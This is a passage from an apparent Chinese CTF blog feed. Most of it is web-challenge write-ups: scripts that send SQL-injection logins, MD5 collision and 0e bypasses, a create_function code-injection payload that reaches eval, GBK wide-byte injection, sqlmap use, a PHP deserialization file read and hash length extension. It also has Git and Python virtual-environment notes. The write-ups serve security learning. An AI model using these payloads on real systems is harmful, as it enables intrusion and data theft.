'http://120.79.1.69:8887/web5/?check'req = s.get(url)req.encoding = 'utf-8'd = re.findall("&lt;div class='rep'&gt;(.*?)&lt;/div&gt;", req.text)[0]d = d.replace('（', '(')d = d.replace('）',')')d = d.replace('X','*')num = round(eval(d))data = &#123;'username':"1'oorr(1=1)#", 'password':'ajahas&amp;&amp;*44askldajaj', 'code':'&#123;&#125;'.format(num)&#125;req1 = s.post(url, data)req1.encoding = 'utf-8'print(req1.text) 之后跑出的页面显示了一个链接，是让代码审计的，下载下来一个zip文件，根据网页上的密码解密后得到一个txt文件和一个zip加密文件，要根据txt文件的内容才能得到那个zip文件的密码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556Private Function getPassword(ByVal str As String) As String Dim reString As String Dim i As Integer i = 1 While (i &lt;= Len(str)) reString = reString &amp; Mid(str, i, 1) i = i + (i Mod 5) Wend getPassword = reStringEnd FunctionPrivate Sub Command1_Click() Dim Dictionary As String Dictionary = "VmxSS05HSXhXbkpOV0VwT1YwVmFWRll3Wkc5VVJsbDNWMnhhYkZac1NqQlpNRll3VlRBeFNWRnNjRmRpUmtwSVZsY3hSMk14V2xsalJsSnBVakpvV0ZaR1dsWmxSbHBYWWtSYVZtRjZWbGRVVmxwelRrWmFTR1ZHWkZSaGVrWlhWR3hTVjFZeVJuSlhiRUpYWVRGYVYxcFhlRkprTVZaeVkwZHNVMDFWY0ZkV2JURXdWREZSZUZkcmFGVmlhelZvVlcxNFMxWXhjRlpXVkVaUFlrYzVObGt3VmpCWFJrcHpWbXBTVjFadFVqTldiWE4zWkRKT1IySkdaRmRTVm5CUVZtMTBhMVJyTVVkVmJrcFZZa2RTVDFac1VsZFdNVlY0Vld0a1ZVMXNXbGhXTVdodlZsZEtSMU5yWkZWV1JVVXhWV3hhWVZkSFZraGtSbVJUWWtoQ1JsWnJaRFJWTWtaMFUydG9WbUpHV2xoV01HUnZWVVp3V0UxWGNHeFdhelY2V1ZWYVlWUnNXbkpYYm1oWFlrWktVRlY2Um10U01WcFpZVVpXVjJKRmNIaFdSM1JXVFZVd2QyTkdWbFZoTVZwTVZtdFZNVkpuSlRORUpUTkU=" Dim password As String password = getPassword(Dictionary) Dim psw As String psw = Text1.Text If (psw = password) Then MsgBox "The password is correct!", vbOKOnly, "密码正确" Text1.Text = "Password for next pass : " &amp; getPassword(password) Else MsgBox "PasswordFail!", vbOKOnly, "密码错误" End If End Sub 这些都是VB语言，我理解错了其中的一行代码然后写出了错误的脚本… 大佬的脚本： 12345678910111213def getPassword(string): i = 1 reString = '' while i &lt;= len(string) : reString = reString + string[i-1] i = i + (i % 5) return reStringDictionary = "VmxSS05HSXhXbkpOV0VwT1YwVmFWRll3Wkc5VVJsbDNWMnhhYkZac1NqQlpNRll3VlRBeFNWRnNjRmRpUmtwSVZsY3hSMk14V2xsalJsSnBVakpvV0ZaR1dsWmxSbHBYWWtSYVZtRjZWbGRVVmxwelRrWmFTR1ZHWkZSaGVrWlhWR3hTVjFZeVJuSlhiRUpYWVRGYVYxcFhlRkprTVZaeVkwZHNVMDFWY0ZkV2JURXdWREZSZUZkcmFGVmlhelZvVlcxNFMxWXhjRlpXVkVaUFlrYzVObGt3VmpCWFJrcHpWbXBTVjFadFVqTldiWE4zWkRKT1IySkdaRmRTVm5CUVZtMTBhMVJyTVVkVmJrcFZZa2RTVDFac1VsZFdNVlY0Vld0a1ZVMXNXbGhXTVdodlZsZEtSMU5yWkZWV1JVVXhWV3hhWVZkSFZraGtSbVJUWWtoQ1JsWnJaRFJWTWtaMFUydG9WbUpHV2xoV01HUnZWVVp3V0UxWGNHeFdhelY2V1ZWYVlWUnNXbkpYYm1oWFlrWktVRlY2Um10U01WcFpZVVpXVjJKRmNIaFdSM1JXVFZVd2QyTkdWbFZoTVZwTVZtdFZNVkpuSlRORUpUTkU="password = getPassword(Dictionary)password = getPassword(password)print(password) 解出来图片用010editor打开就看到flag了 audit源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566&lt;?phphighlight_file(__FILE__);include('flag.php');$str1 = @$_GET['str1'];$str2 = @$_GET['str2'];$str3 = @$_GET['str3'];$str4 = @$_GET['str4'];$str5 = (string)@$_POST['str5'];$str6 = (string)@$_POST['str6'];$str7 = (string)@$_POST['str7'];if( $str1 == $str2 )&#123; die('str1 OR Sstr2 no no no');&#125;if( md5($str1) != md5($str2) )&#123; die('step 1 fail');&#125;if( $str3 == $str4 )&#123; die('str3 OR str4 no no no');&#125;if ( md5($str3) !== md5($str4))&#123; die('step 2 fail');&#125;if( $str5 == $str6 || $str5 == $str7 || $str6 == $str7 )&#123; die('str5 OR str6 OR str7 no no no');&#125;if (md5($str5) !== md5($str6) || md5($str6) !== md5($str7) || md5($str5) !== md5($str7))&#123; die('step 3 fail');&#125;if(!($_POST['a']) and !($_POST['b']))&#123; echo "come on!"; die();&#125;$a = $_POST['a'];$b = $_POST['b'];$m = $_GET['m'];$n = $_GET['n'];if (!(ctype_upper($a)) || !(is_numeric($b)) || (strlen($b) &gt; 6)) &#123; echo "a OR b fail!"; die();&#125;if ((strlen($m) &gt; 4) || (strlen($n) &gt; 4)) &#123; echo "m OR n fail"; die();&#125;$str8 = hash('md5', $a, false);$str9 = strtr(hash('md5', $b, false), $m, $n);echo "&lt;p&gt;str8 : $str8&lt;/p&gt;";echo "&lt;p&gt;str9 : $str9&lt;/p&gt;";if (($str8 == $str9) &amp;&amp; !($a === $b) &amp;&amp; (strlen($b) === 6))&#123; echo "You're great,give you flag:"; echo $flag;&#125;str1 OR Sstr2 no no no 前四个str用数组即可绕过，但5、6、7要进行碰撞，为了这个上网上找了各种方法，结果一堆生成两个md5值相同的文件之类的，全都是讲如何使两个文件或字符串相同，都没有多一点的吗！！！！！看过叶师傅的一篇文章，讲到过https://github.com/thereal1024/python-md5-collision这个工具，可以生成一堆值不同但md5相同的文件，但无奈的是虚拟机全都有毛病装不上…… 头发不够用了，待更. 终于配置好了这个工具：https://www.cnblogs.com/Datapotumas/p/6475563.html 打开终端，输入 python3 gen_coll_test.py之后即可看到生成了两百多个md5相同的不同文件，可以用md5sum查看它们的md5值 之后就可以写脚本用open().read()将文件内容post传过去绕过 后面代码中的一些函数： 1.ctype_upper:检查字符是不是都是大写字母 2.strtr:转换字符串中特定的字符 参数 string 必需。规定要转换的字符串。 from 必需（除非使用数组）。规定要改变的字符。 to 必需（除非使用数组）。规定要改变为的字符。 array 必需（除非使用 from 和 to）。数组，其中的键名是更改的原始字符，键值是更改的目标字符。 1) echo strtr(&quot;Hilla Warld&quot;,&quot;ia&quot;,&quot;eo&quot;); 会输出&quot;hello world&quot; 2) $arr = array(&quot;Hello&quot; =&gt; &quot;Hi&quot;, &quot;world&quot; =&gt; &quot;earth&quot;); echo strtr(&quot;Hello world&quot;,$arr); 会输出&quot;Hi earth&quot; 3.hash ($algo , $data, $raw_output = FALSE) 参数 algo 要使用的哈希算法，例如：&quot;md5&quot;，&quot;sha256&quot;，&quot;haval160,4&quot; 等。 data 要进行哈希运算的消息。 raw_output 设置为 TRUE 输出原始二进制数据，设置为 FALSE 输出字符串。要传入四个参数：get传入$m和$n，post传入$a和$b；$a要为大写字母，$b要为数字且长度要等于6，$m和$n的长度都不能大于4，$str8等于$a的md5值，$str9等于$b的md5且将$m替换$n后的值 要满足str8弱等于str9，且$a与$b不相等才能得到flag 则用0e进行绕过，当$a为QNKCDZO时，$str8为0e开头的字符串；此时，需寻找哪些六位数数字的md5是以0e开头的，但要使$str9弱等于$str8，需要$str9以0e开头，且后面为纯数字，但六位数字的md5中都含有英文字母，因此用strtr函数替换即可 爆破数字脚本： 123456789101112131415import hashlibfor i in range(100000, 999999): li = [0] * 26 count = 0 strs = hashlib.md5(str(i).encode('utf-8')).hexdigest() if strs[:2] == '0e': for j in strs[2:]: if ord(j) &gt;= 97: li[ord(j)-97] += 1 for k in li: if k!=0: count += 1 if count &lt; 4: print('%d %d' % (i, count), strs) 得到了很多可以使用的数字，最后发包即可： 123456789101112import requestsurl = 'http://120.79.1.69:10007?str1[]=1&amp;str2[]=2&amp;str3[]=3&amp;str4[]=4&amp;m=f&amp;n=1'file1 = open('out_test_000.txt', 'rb').read()file2 = open('out_test_001.txt', 'rb').read()file3 = open('out_test_002.txt', 'rb').read()data = &#123;'str5':file1, 'str6':file2, 'str7':file3, 'a':'QNKCDZO', 'b':965253&#125;s = requests.post(url, data)print(s.text) md5(965253)为0ef3ff89396f5550f1074985635155f4，因此此题加点难度，将m和n限制在一位也是可以的 not-easy题目： 123456789101112131415&lt;?phperror_reporting(0);if(isset($_GET['action'])) &#123; $action = $_GET['action'];&#125;if(isset($_GET['action']))&#123; $arg = $_GET['arg'];&#125;if(preg_match('/^[a-z0-9_]*$/isD', $action))&#123; show_source(__FILE__);&#125; else &#123; $action('', $arg);&#125; 涉及到了preg_match，理一下里面的语法： 表达式的格式： &quot;/表达式/[修正符]&quot; $表示行结尾，^表示行开始 /i不区分大小写 /s匹配任何不可见字符 /D如果使用$限制结尾字符，则不允许结尾有换行如果preg_match的表达式中同时含有^和$，那么绕过其中一个限制即可绕过preg_match 那么$action开头或结尾中不允许有大小写英文字母、数字、下划线及任何不可见字符；且由else中表达式可知$action为一个函数 在做这个题之前，先从另一个题了解preg_match的特点： 在服务器端创建一个index.php文件和一个flag.txt文件，在flag.txt中写入一个flag，在index.php中写入： 1234567891011&lt;?phperror_reporting(0);$action = $_GET['action'];if(preg_match('/^(.*)flag(.*)$/', $action))&#123; echo 'be matched!';&#125; else &#123; $file = trim($action.'.txt'); echo file_get_contents($file);highlight_file(__FILE__);&#125; php的正则表达式中的.表示任意一个除换行符之外的字符 %0a为换行符的url编码， 则构造payload： action=%0aflag即可读取到flag.txt中的内容 再回到这个题，如何才能找到特殊字符避开preg_match呢？ 可以用写脚本的方法，将ascii码尝试一遍，找到合适的，但写脚本的时候试了一下eval这个函数，发现没有测试成功，再仔细看下$action(&#39;&#39;,&#39;&#39;,$arg);，发现$action函数里面有两个参数，则尝试var_dump可以： 此函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。 脚本： 1234567891011121314151617import requestsfor i in range(128): url = 'http://127.0.0.1:80' i = str(hex(i)) if len(i) &lt; 4: i = '0x0' + i[-1] i = i.replace('0x', '%') payload = '?action=' + i + 'var_dump' + '&amp;arg=sss;' url = url + payload s = requests.get(url) if 'string' in s.text: print(url) 得到url： http://127.0.0.1:80?action=%5cvar_dump&amp;arg=sss;%5c即反斜杠的url编码，那么为什么函数前面加个反斜杠，但函数还能正常使用呢？在ph师傅的知识星球中找到了答案 php里默认命名空间是\，所有原生函数和类都在这个命名空间中。普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\function_name() 这样调用函数，则其实是写了一个绝对路径。 如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。 现在可以绕过并执行命令了，但要如何找到flag在哪呢？也就是如何获取服务器端目录？ 了解到以下函数的使用： creat_function : 从参数创建一个匿名函数，并返回一个唯一的名称 如，创建一个运算对数的匿名函数： 123456&lt;?php$newfunc = create_function('$a,$b', 'return "ln($a) + ln($b) = " . log($a * $b);');echo "New anonymous function: $newfunc\n";echo $newfunc(2, M_E) . "\n";?&gt; 输出： New anonymous function: lambda_1 ln(2) + ln(2.718281828459) = 1.6931471805599函数原型为： 123function test($a, $b)&#123; return "ln($a) + ln($b) = " . log($a * $b);&#125; 此时构造： ?action=%5ccreate_function&amp;arg=return 222}eval($_GET[&apos;t&apos;]);/*&amp;t=var_dump(scandir(&apos;./&apos;));则传过去后函数原型为： 12345function test()&#123; return 222&#125; eval($_GET['t']); /*&#125; 则将eval($_GET[&#39;t&#39;]);这句代码插入到了服务器端，再构造参数t，用scandir(‘./‘)获取当前目录下所有文件 如果这道题改一下，将$action(&#39;&#39;, $arg);里的参数交换位置，即$action($arg, &#39;&#39;)，那么构造的语句就变成： ?action=%5ccreate_function&amp;arg=){}eval($_GET[&apos;t&apos;]);/*t=var_dump(scandir(&apos;./&apos;));参数传递过去后函数原型为： 123456function test()&#123;&#125;eval($_GET['t']);/*)]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Git使用学习]]></title>
    <url>%2F2019%2F04%2F03%2FGit%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[学习git常用命令 git init使用 Git 来对现有的项目进行管理 git add来实现对指定文件的跟踪，并处于暂存状态 git commit将文件提交到本地仓库 git commit -m this is my first commit-m后面跟上提交的日志 git status查看当前分支以及当前文件状态 比如，在当前文件夹git init后，新建一个a.txt的文件，在里面写入hello，之后git status，会输出： On branch master No commits yet Untracked files: (use &quot;git add &lt;file&gt;...&quot; to include in what will be committed) a.txt nothing added to commit but untracked files present (use &quot;git add&quot; to track)这表明当前在master这个分支上，还显示a.txt是Untracked files，即未跟踪文件；此时，再在a.txt中写入world，再次git status，发现输出仍与上面相同 现在，输入git add a.txt，执行git status，发现输出： On branch master No commits yet Changes to be committed: (use &quot;git rm --cached &lt;file&gt;...&quot; to unstage) new file: a.txt表明a.txt是已被跟踪的文件，已在暂存区，并没有被commit提交到本地仓库；此时修改a.txt中的内容，在下面增加一行awsl，保存后执行git status： On branch master No commits yet Changes to be committed: (use &quot;git rm --cached &lt;file&gt;...&quot; to unstage) new file: a.txt Changes not staged for commit: (use &quot;git add &lt;file&gt;...&quot; to update what will be committed) (use &quot;git checkout -- &lt;file&gt;...&quot; to discard changes in working directory) modified: a.txt表明a.txt已经被暂存了，但Changes not staged for commit表明修改后并没有暂存；现在将修改后的a.txt进行暂存，依旧输入git add a.txt，再查看状态，输出： On branch master No commits yet Changes to be committed: (use &quot;git rm --cached &lt;file&gt;...&quot; to unstage) new file: a.txt现在，将a.txt存放到本地仓库，使用git commit -m： git commit -m 添加了a.txt到仓库之后git status显示： On branch master nothing to commit, working tree clean表明当前工作目录很干净，所有已跟踪文件在上次提交后都未被更改过；还表明当前文件夹下没有出现未被跟踪的新文件 另：如果感觉git status输出内容复杂，可以使用-s使输出更简短 git clone比如，要克隆 Git 的可链接库 libgit2，可以用下面的命令： $ git clone https://github.com/libgit2/libgit2克隆的同时改变仓库的名字： $ git clone https://github.com/libgit2/libgit2 mylibgit初次克隆某个仓库的时候，工作目录中的所有文件都属于已跟踪文件，并处于未修改状态。 git rm如要从仓库中移除某个文件，则需从暂存区移除，再commit 从Git仓库(暂存区)中移除，且不保留文件： git rm b.txt只是从Git仓库(暂存区)中移除，而将文件保留在本地工作目录： git rm --cached b.txtgit log查看提交历史 git reset还原以前的版本： git reset --hard 9d9fab3bd7e53c454dee1c9a7abc01e499882815git ls-files查看本地仓库文件 git remote操作远程仓库 查看绑定的远程仓库： git remote -v绑定远程仓库： git remote add origin https://github.com/gtfly/hello.git其中，orgin为设置的远程仓库名称(别名)，gtfly为用户名，hello为远程仓库 删除绑定的远程仓库： git remote rm origin或者进入.git文件夹下修改config文件也是可以滴！ git push将本地仓库推送到远端仓库 假设当前工作分支为master(origin为绑定时设置的远程仓库名称)： git push -u origin mastergit pull获取远端数据并合并到当前分支 现在，我将我的a.txt文件git push到远端，然后在远端将a.txt中添加了good，此时，我再git push到远端，会输出报错信息： To https://github.com/gtfly/hello.git ! [rejected] master -&gt; master (fetch first) error: failed to push some refs to &apos;https://github.com/gtfly/hello.git&apos; hint: Updates were rejected because the remote contains work that you do hint: not have locally. This is usually caused by another repository pushing hint: to the same ref. You may want to first integrate the remote changes hint: (e.g., &apos;git pull ...&apos;) before pushing again. hint: See the &apos;Note about fast-forwards&apos; in &apos;git push --help&apos; for details.这样就是产生冲突了，解决的方法就是先获取更新，再git push： git pull origin此时，打开工作目录下的a.txt，发现里面多了good，这就是从远端获取到的更新；之后再修改a.txt、add、commit后，再push就不会报错啦！ git fetch获取远端的更新，不会自动合并到当前分支 获取远端(origin)数据： git fetch orgin 查看获取到的数据与本地仓库差别： git log -p master..origin/master将远端数据合并到本地： git merge origin/master常见git文件作用1..git/index中会缓存git add的文件，这里在没有commit的情况下，也是存在的https://github.com/lijiejie/GitHack lijiejie的这个就是获取的这个2..git/refs/heads/master记录了master的commit的hash，由此可以解析出这个commit的所有文件3..git/logs/HEAD其中存储了git的log信息，可以找到历史的commit项4..git/refs/stash工作进度的临时保存]]></content>
      <categories>
        <category>Github</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[SQL宽字节注入学习]]></title>
    <url>%2F2019%2F04%2F01%2FSQL%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[学习mysql的宽字节注入 首先需要知道一些编码的知识： ANSI 编码为了扩充ASCII编码，以用于显示本国的语言，不同的国家和地区制定了不同的标准，由此产生了 GB2312, BIG5, JIS 等各自的编码标准；这些使用2个字节来代表一个字符的各种汉字延伸编码方式成为ANSI编码 GB2312GB2312是ANSI编码中的一种，是一个简体中文字符集 高字节从A1到F7, 低字节从A1到FE GBK对于人名、古汉语等方面出现的罕用字，GB 2312不能处理，这导致了后来GBK及GB 18030汉字字符集的出现 GBK采用双字节表示，首字节在81-FE 之间，尾字节在40-FE 之间 URL编码感觉学那么长时间了，这个知识有时候还是会感到很迷，记一下 URL有一些组成成分，以特殊字符来标志隔开，比如&amp;是“与、和”的意思，?后面跟的是参数部分，\是分割目录的字符…… 再例如，在百度输入框输入“你好”，然后回车，会显示含有“你好”关键字的各种文章，url此时为： https://www.baidu.com/s?ie=utf-8&amp;f=8&amp;rsv_bp=1&amp;rsv_idx=1&amp;tn=baidu &amp;wd=%E4%BD%A0%E5%A5%BD&amp;rsv_pq=8bf8a071000022ab&amp;rsv_t=d8a9pgwstMQ JuWgI48JEK5gL8433%2Bnxs8tWzpruDQJ7A%2F7fA9YG5Fl7CqCY&amp;rqlang=cn&amp;rsv_enter=1&amp;rsv_sug3=7&amp;rsv_sug1=6&amp;rsv_sug7=101&amp;rsv_sug2=0&amp;inputT=1229&amp;rsv_sug4=2331可以看到，输入的“你好”被编码为%E4%BD%A0%E5%A5%BD，因此，可以直接修改这个url里面wd的值即可完成查询 但，要想修改url然后百度url中的特殊字符呢？例如让wd=&amp;这样会怎样呢？经测试，发现又回到了百度主页，并没有进行搜索 这就凸显了url编码的作用，即将任何不是简单七位ASCII(比如汉字)进行url编码，也包括url中的特殊字符 那么，在进行get注入时为什么不能直接用#也就明白了： #是url中的锚部分，即代表网页中的一个位置，比如，http://www.example.com/index.html#print就代表网页index.html的print位置。浏览器读取这个URL后，会自动将print位置滚动至可视区域。 因此，输入#，浏览器就会认为这是一个锚标志，就不会将其传到服务器端；但将其编码成%23再放到参数部分传过去，服务器接收端就会接收%23并将其转换为#，就把它当成注释符了 宽字节注入一些字符及其url编码： &apos; : %27 \ : %5c有时候，服务器端会对单引号以及反斜杠进行过滤：输入&#39;，会转换成\&#39;，输入\，会转换成\\；添加反斜杠就会使后面的单引号或反斜杠失去作用 当mysql使用GBK编码时，就认为两个字节为一个汉字；例如，在进行get注入时，输入%dd%27后，服务端接收到，会在%27即单引号前添加反斜杠，而urlencode(&quot;\&#39;&quot;)=%5c%27，此时形成了%dd%5c%27，而%dd%5c会被认为是一个汉字，则绕过了反斜杠的作用，从而使单引号起了作用，便可进行注入]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Bugku-encrypt]]></title>
    <url>%2F2019%2F04%2F01%2FBugku-encrypt%2F</url>
    <content type="text"><![CDATA[昨天做了bugku上的一道关于加密解密的题，与我寒假时做到另一道题很像(当时没做出来)，主要就是分析代码，利用已知条件去推未知条件，然后用逆向思维去写反解脚本。写一下思路 PHP_encrypt_1(ISCCCTF)fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA= 下载下来一个php文件： 123456789101112131415161718192021&lt;?phpfunction encrypt($data,$key)&#123; $key = md5('ISCC'); $x = 0; $len = strlen($data); $klen = strlen($key); for ($i=0; $i &lt; $len; $i++) &#123; if ($x == $klen) &#123; $x = 0; &#125; $char .= $key[$x]; $x+=1; &#125; for ($i=0; $i &lt; $len; $i++) &#123; $str .= chr((ord($data[$i]) + ord($char[$i])) % 128); &#125; return base64_encode($str);&#125;?&gt; 根据代码，首先可以判断出$data这个传进函数中的变量就是flag，再看看已知的： $key = md5(&apos;ISCC&apos;); # 729623334f0aa2784a1599fd374c120d $x = 0; $klen = strlen($key); # 32 base64_decode($str)其中，将最后得到的字符串进行base64解码得到了一堆乱符，那就转换为ascii符： 12345678910&lt;?php$str = 'fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=';$decodes = base64_decode($str);for ($i=0; $i&lt;strlen($decodes); $i++)&#123; echo ord($decodes[$i]); echo " ";&#125;?&gt; 得到：125 30 26 29 108 46 20 38 24 87 39 69 71 19 42 30 24 66 40 27 30 31 87 91 23 40 43 71 18 22 39 85 24 22 26 45 22 48 函数中有两个for循环，分析第一个for循环： 12345678for ($i=0; $i &lt; $len; $i++) &#123; if ($x == $klen) &#123; $x = 0; &#125; $char .= $key[$x]; $x+=1; &#125; $key=md5(&#39;ISCC&#39;)，$klen=32，$char .= $key[$x]即为$char = $char.$key[$x]，$char在函数里面是没有定义的，运行的时候php会抛出Notice，但还是会输出结果，就是把$char当成空字符串处理： 如，运行这行代码： echo $char.&apos;hello&apos;;会输出： Notice: Undefined variable: char in D:\phpStudy\PHPTutorial\WWW\bugkus.php on line 24 hello如果$len&lt;=32，即flag的长度不超过32位，那么最后得到的$char即为md5(‘ISCC’)的前$len位；如果$len&gt;32，那么得到的$char前32位就是md5(‘ISCC’)，32位之后的为md5(‘ISCC’)从头开始的数据 下面分析第二个循环： 123for ($i=0; $i &lt; $len; $i++) &#123; $str .= chr((ord($data[$i]) + ord($char[$i])) % 128); &#125; 刚才得到了$str对应的ascii码，而且$char处于半知状态(知道其内容，但不知道其长度)；但是细心一点会发现，得到的$str的长度就等于$len的值，即 strlen(&apos;fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=&apos;)那么也就知道了$char的值，则可以求出$data： 根据$str .= chr((ord($data[$i]) + ord($char[$i])) % 128)，$char是已知的，$str是已知的，只有一个位置的$data，化简后式子为： ord($str[$i]) = (ord($data[$i]) + ord($char[$i])) % 128这个式子用简单数学的方法想一下： (5 + 7) % 10 = 2 5 = 10 + 2 - 7由于ascii码范为0-127，情况正好符合上面的10以内的运算，则： ord($data[$i]) = 128 + ord($str[$i]) - ord($char[$i])写脚本跑出来： 123456789101112131415161718192021222324$result = [125, 30, 26, 29, 108, 46, 20, 38, 24, 87, 39, 69, 71, 19, 42, 30, 24, 66, 40, 27, 30, 31, 87, 91, 23, 40, 43, 71, 18, 22, 39, 85, 24, 22, 26, 45, 22, 48];$flag = [];$char = '';$key = md5('ISCC'); //729623334f0aa2784a1599fd374c120d$x = 0;$len = 38;$klen = strlen($key); //32for ($i=0; $i &lt; $len; $i++) &#123; if ($x == $klen) &#123; $x = 0; &#125; $char .= $key[$x]; $x+=1;&#125;for ($i=0; $i &lt; $len; $i++) &#123; $flag[$i] = $result[$i] + 128 - ord($char[$i]); echo chr($flag[$i]);&#125;echo "&lt;br&gt;"; 得到： Ælagº{asdqwdfasfdawfefqwdqwdadwqadawd}]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[newBugku-web19]]></title>
    <url>%2F2019%2F03%2F27%2FnewBugku-web19%2F</url>
    <content type="text"><![CDATA[这道题含有的知识点挺多的，单独写一篇wp 首先，扫描出了一些目录： 访问flag.txt，结果是没有用的信息： 还发现是git泄露，则用GitHack修复，不过这里有个版本问题，用我开始版本的恢复，只下载下来flag.txt这个文件，而且打开后还是Hint 1: flag is in xxxxxxxxx 后来下载了另一个版本的GitHack，https://github.com/BugScanTeam/GitHack，下载下来一个.git文件，在这个目录外执行git show，出现了提示，这个命令好像是查看文件提交的到本地仓库的一些信息吧.. 发现提示目录，则访问这个目录： 是一个登录框，发现是post时间盲注：1&#39;)and sleep(5)#；则用sqlmap进行爆库。还是第一次用sqlmap进行post注入，找了好多方法，这里使用其中一个方法： 先用burp抓包，然后将请求数据保存下来(这里保存为content.txt)： 打开sqlmap，输入指令: python2 sqlmap.py -r content.txt http://123.206.31.85:10019/eXpl0ve5p0cVeRymuCh/index.php --dump 这里-r是读取文件的意思，然后dump爆出所有内容并将爆出的数据存储到表格中 爆出了两个表，一个是登录的账号和密码，一个是一张图片： 登录后： 登录后并没有发现有用的信息；则分析图片，图片中的php代码为： class ReadFile{ public $file; public function __destruct(){ echo file_get_contents(dirname(__FILE__).$this-&gt;file); } }其中，file_get_contents()函数是将文件的内容读取到字符串中；dirname()函数为获取路径中的目录部分；__FILE__为当前文件绝对路径 后来发现登录后的页面其实是提示用了snow加密！snow加密就是将信息隐藏到空白字符中 解密工具在线解密 用编辑器打开，确实发现了有些内容被隐藏了(Ctrl+A) 之后用在线解密工具解密，不过发现行不通…用其他浏览器测试了一下，一访问note.php这个文件，发现要输入账号和密码，也就是说不能直接去解密这个网页，因为没有登录的话会重定向到登录页 然后这个星期几乎就在配置本地解密环境…开始用windows10发现行不通然后又下了win7-32虚拟机也不行…jar文件需要java 1环境也行不通…最后用的SNOW applet弄出来了(哭晕)： 在java.com下载安装好java后，然后用IE浏览器打开http://fog.misty.com/perry/ccs/snow/jsnowapp/jsnowapp.html，配置好安全站点之后就能运行解密程序了…还有，输入password的时候不能复制粘贴… 之后访问这个页面什么都没有，但flag是藏在里面的。根据上面图片中的类，可以推测知识点是反序列化，但用什么方式提交呢？后来抓包，发现cookie中藏有信息： 将cookie中的信息url解密，得到： O:8:”UserInfo”:2:{s:8:”username”;s:5:”admin”;s:8:”password”;s:14:”p0CLOvesExpT00”;}; 之后构造序列化(要注意文件的相对路径！！！！！)： &lt;?php class ReadFile{ public $file; public function __destruct(){ echo file_get_contents(dirname(__FILE__).$this-&gt;file); } } $a = new ReadFile(); $a-&gt;file=&apos;../../PPPPOOO0CCCC.php&apos;; echo serialize($a); ?&gt;得到： O:8:”ReadFile”:1:{s:4:”file”;s:22:”../../PPPPOOO0CCCC.php”;} 将其url编码，放到cookie中即可 今天看到一篇赛博杯wp上有关于snow加密的解法： 0D0A是换行，剩下的将20转0，将09转1，得到的二进制数据，转字符串即可]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Python虚拟环境]]></title>
    <url>%2F2019%2F03%2F25%2FPython%E5%88%9B%E5%BB%BA%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%2F</url>
    <content type="text"><![CDATA[虚拟环境就是一个独立的环境，可以与其他环境隔离开，防止安装的各种包之间产生版本冲突等作用 安装虚拟环境环境：windows10，python3.6 1.安装设置虚拟环境的工具virtualenv pip install virtualenv2.在某个盘新建一个文件夹，如D:/python3 virtualenv 3.cd到新建的目录，创建一个需要安装虚拟环境的目录，这里是python3_env python -m venv python3_env4.cd到python3_env，再cd到Scripts，进行激活 activate5.之后可以输入pip list验证激活成功；之后就可以安装各种包了 6.退出虚拟环境： deactivate参考： https://blog.csdn.net/sinat_37967865/article/details/79673238]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[hash扩展学习]]></title>
    <url>%2F2019%2F03%2F21%2FHash%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[MD5的运算流程下面大致了解一下MD5的运算流程： 1.填充消息：首先，被MD5的字符串长度 ≡ 56 mod 64，即填充后的长度比64的整数倍少8；即使长度满足了要求，仍然需要填充；填充的第一位为0x80，剩下填充0x00； 2.填充长度：用8字节表示填充前的长度，附在第一步所得结果之后；8字节的第一位的值为填充前的长度的bit值，剩下七位的值为0x00； 3.分组：以64位为一组进行分组； 4.进行复杂的数学变化：第一组使用默认的registers值进行复杂的数学变化，之后产生一组新的registers值供下一组复杂的数学变化来调用 其中，registers为： MD5的中间结果和最终结果保存在4字节的缓冲区中，缓冲区用4个4字节的寄存器(A,B,C,D表示)，这些寄存器初始化为下列32bit的16进制整数： A = 67452301 B = EFCDAB89 C = 98BADCFE D = 10325476 大致先了解这么多…… hash长度扩展hash长度扩展的意思就是： 若知道字符串salt的长度，以及sha1(salt)的值，那么就可以得到sha1(salt+填充数据+data)的值；这里填充数据为salt进行hash运算时填充的数据；data为任意字符串 下面分析一道实验吧里的hash长度扩展的题目： 题目地址：http://ctf5.shiyanbar.com/web/kzhan.php/index.php 首先抓包，将source=0改成source=1，得到源码；这里就不放源码了，题目的意思就是： 已知： 1.lenth($secret) = 15 2.md5($secret+&apos;adminadmin&apos;) = 571580b26c65f306376d4f64e53cb5c7求： md5($secret+&apos;adminadmin&apos;+任意数据)则按照上述MD5运算流程： 1.填充消息：由于$secret+&#39;adminadmin&#39;的长度为25，则需要填充31位，第一位为0x80，剩下三十位为0x00； 2.填充长度：填充消息前的长度为25，则填充的值第一位为25*8=200bit，即16进制的0xc8，后面七位为0x00； 则填充之后的数据为： \x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x00\x00\x00\x00\x00\x00\x00如果将填充之后的数据后面加上字符串”dawn”，那么进行MD5运算时填充后会分为两组，第一组得到的registers的值即为md5($secret+&#39;adminadmin&#39;)，之后再与第二组进行“复杂的数学运算”，即可在不知道$secret的情况下得出MD5结果 